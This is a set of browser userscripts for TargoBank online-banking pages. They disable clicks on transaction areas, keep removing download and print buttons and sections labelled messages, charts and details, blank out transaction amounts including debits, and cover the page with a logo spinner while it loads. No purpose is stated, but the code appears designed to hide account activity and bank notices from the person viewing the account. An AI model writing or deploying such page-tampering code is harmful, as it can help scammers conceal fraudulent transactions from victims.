//-----------------------TARGO UMSAETZE UTILITY-----------------------TARGO UMSAETZE UTILITY-----------------------TARGO UMSAETZE UTILITY-----------------------TARGO UMSAETZE UTILITY-----------TARGO UMSAETZE UTILITY---------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO UMSAETZE UTILITY-----------------------TARGO UMSAETZE UTILITY-----------------------TARGO UMSAETZE UTILITY-----------------------TARGO UMSAETZE UTILITY---------------------------------TARGO UMSAETZE UTILITY---------------------


//=========================================================================================================================================================================================================================================






if (window.location.href.indexOf("mouvements") > 0 || window.location.href.indexOf("mouvements") > 0 || window.location.href.indexOf("Downloads") > 0) {

(function() {
    'use strict';

    // Function to make an element non-interactive
    function disableInteraction(element) {
        element.style.pointerEvents = 'none';
    }

    // Function to remove elements with a specific title attribute
    function removeElementsWithTitle(title) {
        var elements = document.querySelectorAll('[title="' + title + '"]');
        elements.forEach(function(element) {
            element.remove();
        });
    }

    // Function to remove parent elements of specified text content
    function removeParentElementsByTextContent(textContent) {
        var textElements = document.evaluate('//text()[contains(translate(., "ABCDEFGHIJKLMNOPQRSTUVWXYZ", "abcdefghijklmnopqrstuvwxyz"), "' + textContent.toLowerCase() + '")]', document.body, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
        for (var i = 0; i < textElements.snapshotLength; i++) {
            var textNode = textElements.snapshotItem(i);
            var parentElement = textNode.parentElement;
            if (parentElement) {
                parentElement.remove();
            }
        }
    }

    // Disable clicks within the area of class "_c1 ei_titlelabel _c1" and its children
    var titlelabelArea = document.querySelector('._c1.ei_titlelabel._c1');
    if (titlelabelArea) {
        disableInteraction(titlelabelArea);
    }

    // Disable clicks within the area of class "_c1 ei_titlelabelsblock _c1" and its children
    var titlelabelsblockArea = document.querySelector('._c1.ei_titlelabelsblock._c1');
    if (titlelabelsblockArea) {
        disableInteraction(titlelabelsblockArea);
    }

    // Disable clicks within the area of class "eir_hidexs" and its children
    var hidexsArea = document.querySelector('.eir_hidexs');
    if (hidexsArea) {
        disableInteraction(hidexsArea);
    }

    // Remove elements with title="Herunterladen" and title="Ausdrucken" using MutationObserver
    var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            if (mutation.type === 'childList') {
                removeElementsWithTitle('Herunterladen');
                removeElementsWithTitle('Ausdrucken');
            }
        });
    });

    // Configuration of the MutationObserver
    var observerConfig = { childList: true, subtree: true };

    // Start observing the document
    observer.observe(document.body, observerConfig);

    // Remove parent elements of specified text content
    removeParentElementsByTextContent('Mitteilungen');
    removeParentElementsByTextContent('Grafiken');
    removeParentElementsByTextContent('Details');
})();
 }




//=========================================================================================================================================================================================================================================


// TARGO UEBER UTILITY-----------------------TARGO UEBER UTILITY-----------------------TARGO UEBER UTILITY-----------------------TARGO UMSAUEBERETZE UTILITY---------------------------------TARGO UEBER UTILITY----------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO UEBER UTILITY-----------------------TARGO UEBER UTILITY-----------------------TARGO UEBER UTILITY-----------------------TARGO UEBER UTILITY-----------TARGO UEBER UTILITY------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO UEBER UTILITY-----------------------TARGO UEBER UTILITY-----------------------TARGO UEBER UTILITY-----------------------TARGO UEBER UTILITY---------------------------------TARGO UEBER UTILITY------------------------------------


//=========================================================================================================================================================================================================================================





if (window.location.href.indexOf("targobank") > 0 || window.location.href.indexOf("targobank") > 0 || window.location.href.indexOf("Downloads") > 0) {

(function() {
    'use strict';

    // Function to remove text content under specified classes
    function removeTextContent() {
        // Remove text content under elements with class "_c1 fd neg _c1"
        var negativeElements = document.querySelectorAll('._c1.fd.neg._c1');
        negativeElements.forEach(function(element) {
            element.textContent = '';
            console.log('Removed text content under element with class "_c1 fd neg _c1"');
        });

        // Remove text content under elements with class "_c1 fd _c1"
        var elements = document.querySelectorAll('._c1.fd._c1');
        elements.forEach(function(element) {
            element.textContent = '';
            console.log('Removed text content under element with class "_c1 fd _c1"');
        });
    }

    // MutationObserver to watch for changes in the DOM
    var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            // Check if nodes were added
            if (mutation.addedNodes.length > 0) {
                removeTextContent();
            }
        });
    });

    // Configuration for the observer
    var observerConfig = { childList: true, subtree: true };

    // Start observing the target node for mutations
    observer.observe(document.body, observerConfig);

    // Initial removal on page load
    removeTextContent();
})();
 }



//=========================================================================================================================================================================================================================================


// TARGO SPINNER UTILITY-----------------------TARGO SPINNER UTILITY-----------------------TARGO SPINNER UTILITY-----------------------TARGO SPINNER UTILITY---------------------------------TARGO SPINNER UTILITY----------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO SPINNER UTILITY-----------------------TARGO SPINNER UTILITY-----------------------TARGO SPINNER UTILITY-----------------------TARGO SPINNER UTILITY-----------TARGO SPINNER UTILITY------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO SPINNER UTILITY-----------------------TARGO SPINNER UTILITY-----------------------TARGO SPINNER UTILITY-----------------------TARGO SPINNER UTILITY---------------------------------TARGO SPINNER UTILITY------------------------------------


//=========================================================================================================================================================================================================================================







// ==UserScript==
// @name         Targo Spinner
// @namespace    http://tampermonkey.net/
// @version      2023-12-22
// @description  Add a pulsating spinner to the Targo Bank page during the entire page load
// @author       You
// @match        *://www.targobank.de/*
// @match        https://www.drivehq.com/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    function createSpinner() {
        var background = document.createElement('div');
        background.className = 'app-loading-background';

        var spinner = document.createElement('div');
        spinner.className = 'app-loading-pulsing';

        // Apply styles to the background
        background.style.position = 'fixed';
        background.style.top = '0';
        background.style.left = '0';
        background.style.width = '100%';
        background.style.height = '100%';
        background.style.backgroundColor = 'white';
        background.style.zIndex = '9999';

        // Apply styles to the spinner
        spinner.style.position = 'absolute';
        spinner.style.top = '50%';
        spinner.style.left = '50%';
        spinner.style.transform = 'translate(-50%,-50%)';
        spinner.style.width = '120px';
        spinner.style.height = '120px';
        spinner.style.display = 'block';
        spinner.style.backgroundImage = 'url(https://cdnii.e-i.com/INGR/sd/targobank_de_2019/0.107.39/de/images/css/perso/logo.svg)';
        spinner.style.backgroundSize = '100%';
        spinner.style.animationName = 'pulse';
        spinner.style.animationTimingFunction = 'ease-in-out';
        spinner.style.animationIterationCount = 'infinite';
        spinner.style.animationDuration = '8s';
        spinner.style.animationFillMode = 'both';

        // Append the background and spinner to the document body
        document.body.appendChild(background);
        background.appendChild(spinner);

        return background;
    }

    // Add the spinner during page load
    var spinner = createSpinner();

    // Remove the spinner after 2 seconds
    setTimeout(function() {
        if (spinner) {
            spinner.remove();
        }
    }, 2000);
})();

